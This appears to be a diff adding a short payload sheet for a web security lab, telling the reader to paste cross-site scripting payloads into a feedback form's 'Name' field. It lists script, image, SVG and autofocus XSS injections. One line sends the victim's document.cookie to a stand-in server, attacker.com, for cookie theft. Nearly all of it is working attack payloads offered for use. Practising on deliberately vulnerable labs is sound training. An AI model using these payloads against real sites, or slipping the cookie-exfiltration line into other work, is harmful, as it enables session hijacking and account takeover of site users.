@@ -1,0 +1,19 @@
+Copy one of these payloads into the "Name" field of the feedback form:
+
+Basic XSS:
+<script>alert(document.domain)</script>
+
+Image-based XSS:
+<img src=x onerror=alert(1)>
+
+SVG XSS:
+<svg onload=alert(1)>
+
+Auto-focus XSS:
+<input onfocus=alert(1) autofocus>
+
+For cookie stealing (replace attacker.com with your server):
+<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
+
+To prove XSS works and get the lab solved:
+<script>alert(document.cookie)</script>
